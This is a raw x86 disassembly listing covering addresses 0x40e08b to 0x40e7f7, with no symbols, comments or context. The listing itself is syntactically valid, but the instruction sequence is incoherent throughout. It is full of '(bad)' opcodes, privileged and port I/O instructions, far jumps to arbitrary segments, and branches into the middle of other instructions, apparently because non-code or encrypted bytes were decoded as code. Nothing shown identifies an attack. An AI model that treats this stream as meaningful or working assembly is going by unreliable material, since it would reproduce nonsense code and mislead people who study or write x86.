  40e08b:	dec    edi
  40e08c:	sbb    DWORD PTR [ecx*8-0x50fc9ebf],ebp
  40e093:	stc    
  40e094:	mov    ss,eax
  40e096:	mov    cl,0x35
  40e098:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e09a:	push   edx
  40e09b:	xlat   BYTE PTR ds:[ebx]
  40e09c:	xchg   esp,eax
  40e09d:	pop    edx
  40e09e:	add    edi,edi
  40e0a0:	cdq    
  40e0a1:	(bad)  
  40e0a2:	mov    ecx,0x2c322a6c
  40e0a7:	lea    esi,[eax]
  40e0a9:	push   cs
  40e0aa:	jle    0x40e056
  40e0ac:	jno    0x40e113
  40e0ae:	push   ds
  40e0af:	jbe    0x40e0f9
  40e0b1:	ins    DWORD PTR es:[edi],dx
  40e0b2:	lods   eax,DWORD PTR ds:[esi]
  40e0b3:	or     BYTE PTR [esi-0x2b],cl
  40e0b6:	popa   
  40e0b7:	add    BYTE PTR [ebx],dh
  40e0b9:	cmp    edx,DWORD PTR [eax+0x57eb93c2]
  40e0bf:	sti    
  40e0c0:	enter  0xe6c0,0x1e
  40e0c4:	push   cs
  40e0c5:	push   ss
  40e0c6:	mov    dh,0xb1
  40e0c8:	fs pop ebx
  40e0ca:	inc    edi
  40e0cb:	mov    cl,0xf8
  40e0cd:	jb     0x40e126
  40e0cf:	xor    al,0x95
  40e0d1:	mov    ch,0xf0
  40e0d3:	and    dl,bl
  40e0d5:	push   esp
  40e0d6:	and    BYTE PTR [ebp+0x127a3ffc],bl
  40e0dc:	js     0x40e0a3
  40e0de:	rol    al,1
  40e0e0:	push   0xffffffec
  40e0e2:	and    DWORD PTR [edx+0x1f7f4f5a],0x3e
  40e0e9:	mov    al,BYTE PTR [eax-0x1dfb2e7c]
  40e0ef:	adc    DWORD PTR [esi],esi
  40e0f1:	jmp    0x40e10d
  40e0f3:	dec    ebx
  40e0f4:	push   ebx
  40e0f5:	push   edi
  40e0f6:	cmp    ch,BYTE PTR [ebx]
  40e0f8:	jne    0x40e0ce
  40e0fa:	xor    edi,DWORD PTR [ebx]
  40e0fc:	fmul   QWORD PTR [eax]
  40e0fe:	push   ds
  40e0ff:	loopne 0x40e124
  40e101:	push   es
  40e102:	loope  0x40e0da
  40e104:	pop    esp
  40e105:	adc    eax,0x4a4f195e
  40e10a:	and    al,0x21
  40e10c:	inc    ecx
  40e10d:	in     eax,0xf0
  40e10f:	add    al,al
  40e111:	scas   al,BYTE PTR es:[edi]
  40e112:	jns    0x40e146
  40e114:	push   ecx
  40e115:	inc    edx
  40e116:	xor    BYTE PTR [edi],bl
  40e118:	mov    bl,0x95
  40e11a:	or     DWORD PTR [edx],ebx
  40e11c:	in     eax,0xbd
  40e11e:	push   es
  40e11f:	push   ebp
  40e120:	inc    ebp
  40e121:	iret   
  40e122:	test   eax,0xfdb05c04
  40e127:	repnz int3 
  40e129:	shl    edi,1
  40e12b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e12c:	or     BYTE PTR [eax+esi*4],ch
  40e12f:	je     0x40e132
  40e131:	xchg   BYTE PTR [eax-0x37c2b4c1],ch
  40e137:	inc    edi
  40e138:	pop    eax
  40e139:	xor    BYTE PTR [ebx-0x62],ch
  40e13c:	(bad)  
  40e13d:	sub    esi,DWORD PTR [ecx+ebp*2]
  40e140:	not    bh
  40e142:	cmovp  ebx,DWORD PTR [ebp-0x37]
  40e146:	jb     0x40e1be
  40e148:	inc    ebp
  40e149:	push   cs
  40e14a:	(bad)  
  40e14b:	int    0x9f
  40e14d:	inc    cx
  40e14f:	jb     0x40e176
  40e151:	retf   0x2a56
  40e154:	push   es
  40e155:	(bad)  
  40e156:	jae    0x40e140
  40e158:	xor    BYTE PTR [esi-0x35],0x74
  40e15c:	pop    edi
  40e15d:	stos   DWORD PTR es:[edi],eax
  40e15e:	pusha  
  40e15f:	jp     0x40e1ce
  40e161:	mov    ecx,DWORD PTR [edi+0x7c]
  40e164:	or     edi,esp
  40e166:	dec    edx
  40e167:	and    BYTE PTR [esp+edi*2],dl
  40e16a:	or     ebx,ecx
  40e16c:	bound  ebx,QWORD PTR [edi+ebp*4]
  40e16f:	inc    ebx
  40e170:	mov    eax,ds:0x109ef074
  40e175:	push   ebp
  40e176:	addr16 or eax,ecx
  40e179:	push   0xc5106527
  40e17e:	outs   dx,DWORD PTR ds:[si]
  40e180:	cmp    cl,bl
  40e182:	out    0x52,al
  40e184:	add    al,0x6d
  40e187:	int3   
  40e188:	mov    ds:0x9ec7af63,al
  40e18d:	aad    0x7d
  40e18f:	jecxz  0x40e1c7
  40e191:	into   
  40e192:	adc    al,0x98
  40e194:	outs   dx,BYTE PTR ds:[esi]
  40e195:	and    ebp,edx
  40e197:	xor    eax,0x4861f099
  40e19c:	ret    0x3afd
  40e19f:	daa    
  40e1a0:	cmp    ah,ah
  40e1a2:	mov    esp,0x613d2465
  40e1a7:	xor    eax,0xb77ec6ea
  40e1ac:	cs inc esi
  40e1ae:	push   esp
  40e1af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1b0:	dec    eax
  40e1b1:	mov    ch,0x7b
  40e1b3:	jbe    0x40e146
  40e1b5:	lods   eax,DWORD PTR ds:[esi]
  40e1b6:	(bad)  
  40e1b7:	jae    0x40e1ea
  40e1b9:	out    dx,al
  40e1ba:	ret    
  40e1bb:	mov    ah,0x73
  40e1bd:	mov    al,0x22
  40e1bf:	jmp    0xa764:0xf70c5dda
  40e1c6:	hlt    
  40e1c7:	int    0x81
  40e1c9:	mov    cl,0xa5
  40e1cb:	clc    
  40e1cc:	dec    edi
  40e1cd:	pop    ecx
  40e1ce:	outs   dx,BYTE PTR ds:[esi]
  40e1cf:	inc    esi
  40e1d0:	lock sbb al,0x85
  40e1d3:	in     eax,0x44
  40e1d5:	pop    es
  40e1d6:	add    dh,BYTE PTR [eax-0x7d]
  40e1d9:	idiv   bl
  40e1db:	jmp    0x77e6e788
  40e1e0:	popa   
  40e1e1:	jp     0x40e16e
  40e1e3:	xor    ebx,DWORD PTR [edi-0x177e9dec]
  40e1e9:	or     esi,DWORD PTR [esi]
  40e1eb:	xchg   edi,eax
  40e1ec:	jb     0x40e1b7
  40e1ee:	xor    BYTE PTR [eax+eax*8-0x5a],bh
  40e1f2:	shl    BYTE PTR ds:0x5b74754,0xc2
  40e1f9:	sbb    al,0xc1
  40e1fb:	in     al,dx
  40e1fc:	(bad)  
  40e1fd:	fild   DWORD PTR [ecx]
  40e1ff:	mov    edx,0xdbe414de
  40e204:	add    esi,esi
  40e206:	fcomp  QWORD PTR [edx+eax*1+0x59f0ffc2]
  40e20d:	or     BYTE PTR gs:[ecx+eiz*4+0xef83dd2],cl
  40e215:	loope  0x40e258
  40e217:	js     0x40e1c1
  40e219:	or     BYTE PTR [ecx+ebp*4],0x84
  40e21d:	adc    edi,DWORD PTR [ebx+0x256cb836]
  40e223:	xchg   DWORD PTR [esi],ebx
  40e225:	adc    ch,BYTE PTR [edx]
  40e227:	adc    edi,DWORD PTR [edx-0x602d1905]
  40e22d:	sbb    al,0x4d
  40e22f:	mov    ebp,DWORD PTR [ecx]
  40e231:	jp     0x40e22d
  40e233:	or     DWORD PTR [ecx],0xfaecf1a
  40e239:	mov    ah,cl
  40e23b:	push   ebp
  40e23c:	sub    ah,BYTE PTR [edx+0x1f]
  40e23f:	sbb    DWORD PTR [esp+eax*8-0x5f],0x884a7231
  40e247:	fild   DWORD PTR [ebx+0x66]
  40e24a:	adc    BYTE PTR [edi+0x4e],dl
  40e24d:	mov    eax,0x922ea9e4
  40e252:	out    0x16,al
  40e254:	xor    DWORD PTR ds:0x935613cd,edi
  40e25a:	push   ebp
  40e25b:	cmp    eax,0xca271809
  40e260:	or     dh,BYTE PTR [ebx-0x3a]
  40e263:	retf   0x8810
  40e266:	aas    
  40e267:	leave  
  40e268:	cmp    eax,0xdb24100f
  40e26d:	pop    edi
  40e26e:	cmp    bh,ch
  40e270:	sub    BYTE PTR [eax+0x3b],0x6c
  40e274:	dec    ebp
  40e275:	stc    
  40e276:	rol    BYTE PTR [edx-0x24cd602f],cl
  40e27c:	sbb    dh,BYTE PTR [eax+0x1a5bee83]
  40e282:	adc    eax,0x83067d99
  40e287:	push   ss
  40e288:	push   ecx
  40e289:	mov    eax,ds:0xa6015deb
  40e28e:	sti    
  40e28f:	push   ss
  40e290:	imul   esp,ebx,0x684aaba9
  40e296:	iret   
  40e297:	loope  0x40e265
  40e299:	push   cs
  40e29a:	addr16 inc ecx
  40e29c:	mov    esi,0x7fdb94e8
  40e2a1:	lahf   
  40e2a2:	js     0x40e28b
  40e2a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e2a5:	sub    cl,BYTE PTR [ebp-0x2a5a9efb]
  40e2ab:	mov    ds:0x2c7a0c00,eax
  40e2b0:	shl    edi,1
  40e2b2:	pop    esi
  40e2b3:	leave  
  40e2b4:	add    al,0x23
  40e2b6:	(bad)  
  40e2b7:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e2b9:	ja     0x40e2b5
  40e2bb:	push   eax
  40e2bc:	vpsrlw ymm2,ymm4,XMMWORD PTR [edx]
  40e2c0:	jg     0x40e2fe
  40e2c2:	in     al,dx
  40e2c3:	inc    edx
  40e2c4:	mov    al,ch
  40e2c6:	sbb    al,0x1f
  40e2c8:	xchg   edx,eax
  40e2c9:	jmp    0xd17c55ec
  40e2ce:	and    DWORD PTR ds:0xea84cc6,0x1c
  40e2d5:	std    
  40e2d6:	das    
  40e2d7:	mov    ebx,DWORD PTR [eax-0x70]
  40e2da:	mov    al,0x52
  40e2dc:	pop    ebx
  40e2dd:	arpl   WORD PTR [edi-0x66032516],di
  40e2e3:	(bad)  
  40e2e4:	mov    bl,0xfa
  40e2e6:	push   esi
  40e2e7:	xchg   esi,eax
  40e2e8:	dec    esi
  40e2e9:	gs jmp 0x98890ffa
  40e2ef:	cmp    al,0xe6
  40e2f1:	fistp  WORD PTR [edx+0x32f12846]
  40e2f7:	popa   
  40e2f8:	mov    ah,0xef
  40e2fa:	sbb    BYTE PTR [edx-0x9b3302c],bh
  40e300:	sub    ch,BYTE PTR [ebx-0x67]
  40e303:	push   ecx
  40e304:	and    BYTE PTR [ebx],al
  40e306:	repz xchg esi,eax
  40e308:	cs push edx
  40e30a:	jmp    0x40e353
  40e30c:	mov    BYTE PTR [esi+esi*1],bh
  40e30f:	imul   esp,ebp,0x15
  40e312:	adc    BYTE PTR [eax+eiz*4],0xb0
  40e316:	lods   al,BYTE PTR ds:[esi]
  40e317:	push   ds
  40e318:	cmc    
  40e319:	loope  0x40e373
  40e31b:	cli    
  40e31c:	and    edx,DWORD PTR [ecx-0xdc4794b]
  40e322:	cld    
  40e323:	fisubr WORD PTR [edi-0x3310d1d5]
  40e329:	mov    dl,0x9d
  40e32b:	aaa    
  40e32c:	lahf   
  40e32d:	stos   DWORD PTR es:[edi],eax
  40e32e:	dec    ecx
  40e32f:	adc    BYTE PTR [edi+ecx*4],al
  40e332:	nop
  40e333:	add    eax,0x2b80390d
  40e338:	push   ds
  40e339:	xor    DWORD PTR [edi],edi
  40e33b:	retf   
  40e33c:	jno    0x40e3b5
  40e33e:	arpl   di,dx
  40e340:	test   BYTE PTR [edx+ebx*8+0x5b],0x42
  40e345:	adc    BYTE PTR [edx],0x53
  40e348:	cmp    eax,0x480eef6a
  40e34d:	jmp    0x7eea73da
  40e352:	push   eax
  40e353:	ins    DWORD PTR es:[edi],dx
  40e354:	jmp    0xcc81:0xab8276b6
  40e35b:	lds    eax,FWORD PTR [ebp-0x2043045]
  40e361:	and    eax,0xb9326a71
  40e366:	push   esi
  40e367:	adc    eax,0x3b95c2c1
  40e36c:	add    bh,dh
  40e36e:	adc    ch,BYTE PTR [ebx]
  40e370:	inc    ecx
  40e371:	adc    bl,BYTE PTR [eax]
  40e373:	repnz nop
  40e375:	or     esi,DWORD PTR [edx-0x59c18023]
  40e37b:	add    eax,0xfe643b49
  40e380:	fadd   DWORD PTR [esi+eax*2+0x925ee53]
  40e387:	xchg   esi,eax
  40e388:	cmp    al,0xea
  40e38a:	ins    DWORD PTR es:[edi],dx
  40e38b:	call   FWORD PTR [edi+0x4]
  40e38e:	(bad)  
  40e38f:	pop    esi
  40e390:	xchg   esi,eax
  40e391:	xchg   edi,eax
  40e392:	repnz inc esi
  40e394:	pop    eax
  40e395:	rol    BYTE PTR [ebx],1
  40e397:	enter  0x72a9,0x70
  40e39b:	inc    ecx
  40e39c:	adc    BYTE PTR [edi],bh
  40e39e:	adc    ch,bl
  40e3a0:	sbb    eax,0xaf69264
  40e3a5:	nop
  40e3a6:	add    dl,BYTE PTR [esi]
  40e3a8:	fwait
  40e3a9:	cld    
  40e3aa:	mov    ds:0x7ab79126,eax
  40e3af:	es inc ebx
  40e3b1:	loope  0x40e3b7
  40e3b3:	or     dh,BYTE PTR [edi]
  40e3b5:	popf   
  40e3b6:	call   0x53ea2b8e
  40e3bb:	cwde   
  40e3bc:	mov    ecx,0x67c81f86
  40e3c1:	sbb    BYTE PTR fs:[ecx],0xc0
  40e3c5:	mov    eax,0x1a19f078
  40e3ca:	outs   dx,DWORD PTR ds:[esi]
  40e3cb:	push   0x3b
  40e3cd:	pop    ss
  40e3ce:	and    ecx,ebp
  40e3d0:	jbe    0x40e362
  40e3d2:	mov    ecx,0xa40efd2f
  40e3d7:	push   es
  40e3d8:	and    dh,BYTE PTR [edx-0x25e591ac]
  40e3de:	loope  0x40e3e0
  40e3e0:	inc    ebp
  40e3e1:	mov    BYTE PTR [ecx+0x38506c3e],al
  40e3e7:	in     eax,0x4
  40e3e9:	cmp    al,0x3b
  40e3eb:	div    BYTE PTR [ebp-0x7f13a1a6]
  40e3f1:	adc    ebx,DWORD PTR [esi-0x7]
  40e3f4:	inc    BYTE PTR [ecx-0x74]
  40e3f7:	add    al,0x90
  40e3f9:	lahf   
  40e3fa:	and    eax,0x221b0f26
  40e3ff:	dec    edx
  40e400:	add    BYTE PTR [eax+0x5ba9067d],bl
  40e406:	aad    0x4
  40e408:	mov    dh,0xb5
  40e40a:	mov    ebp,cs
  40e40c:	repnz test al,0x81
  40e40f:	leave  
  40e410:	cli    
  40e411:	jp     0x40e3c7
  40e413:	inc    esi
  40e414:	fwait
  40e415:	sbb    esi,DWORD PTR [edx]
  40e417:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e418:	push   esp
  40e419:	stos   BYTE PTR es:[edi],al
  40e41a:	jmp    0x40e3c4
  40e41c:	icebp  
  40e41d:	(bad)  
  40e41e:	outs   dx,DWORD PTR ds:[esi]
  40e41f:	ficomp DWORD PTR [esi+0x19ef5c73]
  40e425:	idiv   DWORD PTR [ebx-0x1740a5e7]
  40e42b:	cmp    esi,ebp
  40e42d:	and    al,0x2f
  40e42f:	inc    edx
  40e430:	ss mov al,0x35
  40e433:	ja     0x40e485
  40e435:	push   ebx
  40e436:	repz popa 
  40e438:	test   DWORD PTR [ecx+0x43],eax
  40e43b:	mov    ch,0x4b
  40e43d:	xchg   ebp,eax
  40e43e:	jo     0x40e3cc
  40e440:	or     ecx,edx
  40e442:	mov    eax,ds:0x5a055d3e
  40e447:	into   
  40e448:	adc    BYTE PTR [edx-0xaf07ca7],bh
  40e44e:	add    BYTE PTR [edx],ah
  40e450:	arpl   WORD PTR [ebp+edx*1+0x366de524],cx
  40e457:	sbb    dh,cl
  40e459:	shl    DWORD PTR [ecx+0x5a54f477],1
  40e45f:	add    eax,0x650d227
  40e464:	hlt    
  40e465:	stc    
  40e466:	add    al,0x22
  40e468:	pushf  
  40e469:	test   eax,0xf787c0fe
  40e46e:	add    eax,ecx
  40e470:	dec    edi
  40e471:	sub    al,0xd3
  40e473:	loopne 0x40e477
  40e475:	or     edi,esi
  40e477:	cs or  al,0x6f
  40e47a:	inc    esi
  40e47b:	pushf  
  40e47c:	or     DWORD PTR [ebx+edx*1],eax
  40e47f:	xchg   esp,eax
  40e480:	sub    al,0xb
  40e482:	bnd jnp 0x40e45b
  40e485:	mov    bl,BYTE PTR [ebx-0x1d]
  40e488:	test   eax,0x3043a6cc
  40e48d:	mov    BYTE PTR [edi],dh
  40e48f:	jno    0x40e452
  40e491:	jo     0x40e484
  40e493:	adc    bl,BYTE PTR [ebp+0x1b]
  40e496:	adc    al,0xd1
  40e498:	test   DWORD PTR [ebx],eax
  40e49a:	in     al,0x70
  40e49c:	(bad)  
  40e49d:	(bad)  
  40e49e:	test   eax,0xabcf2c4c
  40e4a3:	pop    ecx
  40e4a4:	ret    
  40e4a5:	neg    DWORD PTR [edi+ebx*8+0x11]
  40e4a9:	inc    esp
  40e4aa:	outs   dx,DWORD PTR ds:[esi]
  40e4ab:	in     eax,dx
  40e4ac:	nop
  40e4ad:	in     al,0xad
  40e4af:	jae    0x40e4b9
  40e4b1:	inc    edx
  40e4b2:	pushw  0x16
  40e4b5:	add    DWORD PTR [ecx],ebx
  40e4b7:	mov    ch,0x42
  40e4b9:	das    
  40e4ba:	fsubrp st(6),st
  40e4bc:	adc    bh,ah
  40e4be:	xchg   esi,eax
  40e4bf:	sbb    BYTE PTR [eax-0x6f9aba7f],al
  40e4c5:	outs   dx,DWORD PTR ds:[esi]
  40e4c6:	add    al,0xd3
  40e4c8:	outs   dx,BYTE PTR ds:[esi]
  40e4c9:	stc    
  40e4ca:	mov    ah,0x6b
  40e4cc:	mov    WORD PTR [esi-0x6619b61e],ss
  40e4d2:	mov    al,0xf4
  40e4d4:	outs   dx,DWORD PTR ds:[esi]
  40e4d5:	jp     0x40e4a3
  40e4d7:	das    
  40e4d8:	popf   
  40e4d9:	lods   al,BYTE PTR ds:[esi]
  40e4da:	push   0xb26df448
  40e4df:	jecxz  0x40e4ab
  40e4e1:	nop
  40e4e2:	test   BYTE PTR [ecx-0x3380af54],dl
  40e4e8:	fwait
  40e4e9:	(bad)  
  40e4ea:	cmp    DWORD PTR [eax-0x71364afd],ebp
  40e4f0:	pop    eax
  40e4f1:	pop    eax
  40e4f2:	add    eax,0x2ae50df1
  40e4f7:	xor    ch,BYTE PTR [ebx-0x56]
  40e4fa:	mov    BYTE PTR [ebx+eiz*1+0x2b],ah
  40e4fe:	test   al,0x57
  40e500:	aaa    
  40e501:	arpl   ax,ax
  40e503:	dec    eax
  40e504:	es and eax,0x7355a4b8
  40e50a:	repz adc BYTE PTR [edi],ch
  40e50d:	test   al,0xaa
  40e50f:	jmp    0x4eec:0x7740806b
  40e516:	jmp    0x9d07:0xc2441001
  40e51d:	inc    edx
  40e51e:	mov    eax,0x57cdf9c5
  40e523:	aas    
  40e524:	shl    bl,1
  40e526:	call   0xaa5c:0x96243c88
  40e52d:	adc    ebp,0x60
  40e530:	loop   0x40e52f
  40e532:	sub    DWORD PTR [edx],ecx
  40e534:	cmp    DWORD PTR [ebp-0x17],ebp
  40e537:	cmp    al,0xb5
  40e539:	inc    ecx
  40e53a:	jmp    0x40e4c6
  40e53c:	jae    0x40e56c
  40e53e:	sub    eax,DWORD PTR [ebp+0x62e49288]
  40e544:	(bad)  [ebp+0x35da50e6]
  40e54a:	shl    BYTE PTR [edi+0x2],cl
  40e54d:	aas    
  40e54e:	js     0x40e4eb
  40e550:	add    ebx,DWORD PTR [ebx-0x2daa3051]
  40e556:	mov    al,ds:0xc7dac292
  40e55b:	fidiv  WORD PTR [edi+0x31]
  40e55e:	scas   eax,DWORD PTR es:[edi]
  40e55f:	dec    edx
  40e560:	sbb    BYTE PTR [ecx+ebp*1-0x7e8c992d],0xf0
  40e568:	inc    edx
  40e569:	and    eax,0x47d02c5f
  40e56e:	or     edx,DWORD PTR [ecx]
  40e570:	adc    edx,edx
  40e572:	xor    eax,0x497ca556
  40e577:	gs aas 
  40e579:	imul   edi,DWORD PTR [ecx],0xffffff95
  40e57c:	lock jnp 0x40e526
  40e57f:	dec    ebx
  40e580:	imul   ebx,edi,0x77b79317
  40e586:	jl     0x40e5d4
  40e588:	mov    bl,0x49
  40e58a:	and    BYTE PTR [ebp-0x57ff2594],0x24
  40e591:	jo     0x40e5ca
  40e593:	ins    BYTE PTR es:[edi],dx
  40e594:	inc    edi
  40e596:	jle    0x40e590
  40e598:	jns    0x40e588
  40e59a:	mov    ecx,0xb9791f92
  40e59f:	arpl   bp,si
  40e5a1:	repnz pop ss
  40e5a3:	ret    0xd31c
  40e5a6:	test   BYTE PTR ds:0x4432baee,ah
  40e5ac:	into   
  40e5ad:	or     ch,BYTE PTR [ebp+0x7b]
  40e5b0:	mov    eax,0x92c96f79
  40e5b5:	not    DWORD PTR [esi-0x57]
  40e5b8:	lods   al,BYTE PTR ds:[esi]
  40e5b9:	jb     0x40e555
  40e5bb:	out    0x49,eax
  40e5bd:	pop    ss
  40e5be:	jp     0x40e62c
  40e5c0:	xchg   ebp,eax
  40e5c1:	(bad)  
  40e5c2:	cmp    bh,BYTE PTR [edx-0x29]
  40e5c5:	stos   BYTE PTR es:[edi],al
  40e5c6:	mov    eax,0x95d629e3
  40e5cb:	mov    dl,ah
  40e5cd:	xor    dh,BYTE PTR [edx-0x16f17ba8]
  40e5d3:	(bad)  
  40e5d4:	rcr    DWORD PTR [ebp-0x4d9084ac],1
  40e5da:	pop    esi
  40e5db:	dec    edx
  40e5dc:	pop    DWORD PTR [ebx+ebp*4-0x15]
  40e5e0:	push   eax
  40e5e1:	add    al,0x86
  40e5e3:	les    eax,FWORD PTR [edi]
  40e5e5:	jge    0x40e65a
  40e5e7:	rcl    DWORD PTR [edx+0x10],0x2d
  40e5eb:	jl     0x40e646
  40e5ed:	pop    ss
  40e5ee:	or     eax,0x5444533f
  40e5f3:	ins    DWORD PTR es:[edi],dx
  40e5f4:	push   ebx
  40e5f5:	cdq    
  40e5f6:	jmp    0x6dc8acb
  40e5fb:	lods   eax,DWORD PTR ds:[esi]
  40e5fc:	mov    cl,0x55
  40e5fe:	sub    cl,ch
  40e600:	ins    DWORD PTR es:[edi],dx
  40e601:	push   esp
  40e602:	push   ebx
  40e603:	stc    
  40e604:	inc    esp
  40e605:	add    BYTE PTR [esi+0x2b],bl
  40e608:	pop    eax
  40e609:	addr16 int3 
  40e60b:	imul   ecx,DWORD PTR [edi+0x31],0xffffff80
  40e60f:	hlt    
  40e610:	hlt    
  40e611:	and    bh,ch
  40e613:	jns    0x40e626
  40e615:	jne    0x40e597
  40e617:	jmp    0xba425d69
  40e61c:	ins    BYTE PTR es:[edi],dx
  40e61d:	(bad)  
  40e61e:	ja     0x40e5a1
  40e620:	cmp    BYTE PTR [esi],cl
  40e622:	not    BYTE PTR [ecx]
  40e624:	jle    0x40e642
  40e626:	addr16 sahf 
  40e628:	cwde   
  40e629:	or     BYTE PTR [ebp+0x7c],ah
  40e62c:	mov    bh,0x29
  40e62e:	cmp    DWORD PTR [esi+0x7b],esp
  40e631:	jne    0x40e5bd
  40e633:	jl     0x40e60f
  40e635:	jb     0x40e661
  40e637:	sbb    ebx,ebx
  40e639:	mov    bl,0x75
  40e63b:	not    edi
  40e63d:	jne    0x40e697
  40e63f:	dec    edi
  40e640:	aas    
  40e641:	jl     0x40e650
  40e643:	sbb    BYTE PTR [esi],ah
  40e645:	and    ebx,edx
  40e647:	xor    ebp,DWORD PTR [edx]
  40e649:	cmp    ah,0x80
  40e64c:	sar    DWORD PTR [eax+0x44d0da0a],1
  40e652:	and    eax,0x9169f584
  40e657:	push   esp
  40e658:	fbstp  TBYTE PTR [esi-0x5a64e52d]
  40e65e:	push   ebx
  40e65f:	lds    ebx,FWORD PTR [edi-0x1c]
  40e662:	ss and dl,ah
  40e665:	cwde   
  40e666:	add    al,bl
  40e668:	mov    edx,0x1682f216
  40e66d:	jl     0x40e6ab
  40e66f:	fwait
  40e670:	sahf   
  40e671:	ror    ebx,0x94
  40e674:	mov    bl,0xd5
  40e676:	push   es
  40e677:	lods   eax,DWORD PTR ds:[esi]
  40e678:	push   es
  40e679:	mov    bl,0x97
  40e67b:	popa   
  40e67c:	xor    al,0xf1
  40e67e:	and    al,0xe7
  40e680:	xchg   edi,eax
  40e681:	(bad)  
  40e683:	mov    ecx,0x670e8e30
  40e688:	mov    eax,0x7428c3fd
  40e68d:	and    DWORD PTR [ebx+ebx*8],ebx
  40e690:	ins    DWORD PTR es:[edi],dx
  40e691:	(bad)  
  40e692:	std    
  40e693:	cmp    al,0x75
  40e695:	push   edx
  40e696:	es inc ecx
  40e698:	cmp    BYTE PTR [edi],cl
  40e69a:	xchg   ecx,eax
  40e69b:	(bad)  
  40e69c:	call   0xb3ebdc9f
  40e6a1:	pop    ss
  40e6a2:	xor    bh,BYTE PTR [ebx-0x368be943]
  40e6a8:	imul   esi,DWORD PTR [ebx-0x4bbde2ba],0xddb87ac8
  40e6b2:	mov    es,WORD PTR [ecx-0x66]
  40e6b5:	jle    0x40e6a3
  40e6b7:	pop    ecx
  40e6b8:	jb     0x40e63f
  40e6ba:	pusha  
  40e6bb:	je     0x40e6c3
  40e6bd:	add    DWORD PTR [ebp+0x4044451b],0xffffffb1
  40e6c4:	inc    esi
  40e6c5:	ror    DWORD PTR [edx+0x1fcfd15a],cl
  40e6cb:	inc    edx
  40e6cc:	mov    ds:0x5d893de1,al
  40e6d1:	mov    bl,0x3e
  40e6d3:	adc    ch,BYTE PTR [esi-0x465d2d24]
  40e6d9:	lahf   
  40e6da:	inc    ebx
  40e6db:	sahf   
  40e6dc:	push   ecx
  40e6dd:	adc    cl,dl
  40e6df:	sbb    cl,ch
  40e6e1:	lahf   
  40e6e2:	mov    esi,0x9a227f32
  40e6e7:	fadd   QWORD PTR [ecx-0x15]
  40e6ea:	and    DWORD PTR [esi+0x37b3beb],ebx
  40e6f0:	xlat   BYTE PTR ds:[ebx]
  40e6f1:	pop    ebp
  40e6f2:	mov    bl,BYTE PTR [ecx+0x1572fa8f]
  40e6f8:	mov    ebx,0x11d627e7
  40e6fd:	ss aaa 
  40e6ff:	cmp    dh,BYTE PTR [ecx+edx*1-0x61df145]
  40e706:	push   0x4d
  40e708:	sbb    DWORD PTR [edx-0x3e],esp
  40e70b:	mov    bl,bh
  40e70d:	jle    0x40e72b
  40e70f:	fmul   st(4),st
  40e711:	outs   dx,BYTE PTR ds:[esi]
  40e712:	stos   BYTE PTR es:[edi],al
  40e713:	(bad)  
  40e714:	aas    
  40e715:	inc    eax
  40e716:	ja     0x40e77d
  40e718:	shl    BYTE PTR [edi-0x6f],0x54
  40e71c:	das    
  40e71d:	test   DWORD PTR [eax-0x44813965],eax
  40e723:	pop    esi
  40e724:	lods   al,BYTE PTR ds:[esi]
  40e725:	into   
  40e726:	push   eax
  40e727:	cmc    
  40e728:	sahf   
  40e729:	fnstenv [ecx+0x3d]
  40e72c:	enter  0x6828,0x5b
  40e730:	retf   0xfe6c
  40e733:	jnp    0x40e728
  40e735:	xor    eax,0x48040f04
  40e73a:	mov    al,0x7
  40e73c:	jo     0x40e73f
  40e73e:	mov    esp,0xf786640b
  40e743:	pop    ds
  40e744:	push   ss
  40e745:	stos   BYTE PTR es:[edi],al
  40e746:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e747:	sub    eax,0x3c1ab87d
  40e74c:	ret    0xefb6
  40e74f:	pop    ss
  40e750:	jle    0x40e72a
  40e752:	leave  
  40e753:	in     al,0x70
  40e755:	pop    esi
  40e756:	in     eax,dx
  40e757:	daa    
  40e758:	sbb    eax,0xfad4a793
  40e75d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e75e:	(bad)  
  40e75f:	mov    bl,0x8b
  40e761:	adc    eax,0x77aae936
  40e766:	sti    
  40e767:	jne    0x40e714
  40e769:	aas    
  40e76a:	hlt    
  40e76b:	add    eax,0x296f7703
  40e770:	and    dh,BYTE PTR [ebx+0x74]
  40e773:	sub    DWORD PTR [edi+0x1],ecx
  40e776:	push   0xffffffa4
  40e778:	mov    bl,0x48
  40e77a:	xor    dl,BYTE PTR [eax]
  40e77c:	in     al,0xcd
  40e77e:	mov    edi,0x55e22e3c
  40e783:	xor    dh,bl
  40e785:	bound  ecx,QWORD PTR [eax-0x743a90a6]
  40e78b:	xchg   ah,al
  40e78d:	dec    esp
  40e78e:	test   DWORD PTR [ecx-0x2083f29e],eax
  40e794:	sub    DWORD PTR [esi+0x1e1357d9],ecx
  40e79a:	mov    esp,0x351d1457
  40e79f:	sub    BYTE PTR [edi-0x32],0x1d
  40e7a3:	icebp  
  40e7a4:	(bad)  
  40e7a6:	sub    BYTE PTR [edx-0x20feef63],0x23
  40e7ad:	(bad)  
  40e7af:	dec    edi
  40e7b0:	pop    esp
  40e7b1:	daa    
  40e7b2:	stos   BYTE PTR es:[edi],al
  40e7b3:	push   0x45
  40e7b5:	cmp    DWORD PTR [edx+eiz*2+0x67a10781],0xf2d5805
  40e7c0:	dec    ebp
  40e7c1:	pcmpeqw mm1,QWORD PTR [ebp-0x78bd8102]
  40e7c8:	mov    edx,0xfaee9841
  40e7cd:	repz loopne 0x40e7ed
  40e7d0:	sub    BYTE PTR [eax],ch
  40e7d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e7d3:	mov    ch,0xb4
  40e7d5:	shl    DWORD PTR [esi+edi*1-0x3b],0x3c
  40e7da:	sub    DWORD PTR [ebx+0x71],0xedfb25d9
  40e7e1:	xlat   BYTE PTR ds:[ebx]
  40e7e2:	les    esi,FWORD PTR [esp+ecx*4+0x3873844e]
  40e7e9:	(bad)  
  40e7ea:	arpl   WORD PTR [edx-0x2f],ax
  40e7ed:	xor    DWORD PTR [eax-0x2929f03e],ecx
  40e7f3:	scas   al,BYTE PTR es:[edi]
  40e7f4:	mov    DWORD PTR [ebx-0x4d],edi
  40e7f7:	cmp    DWORD PTR [edx],0xc7cfee73
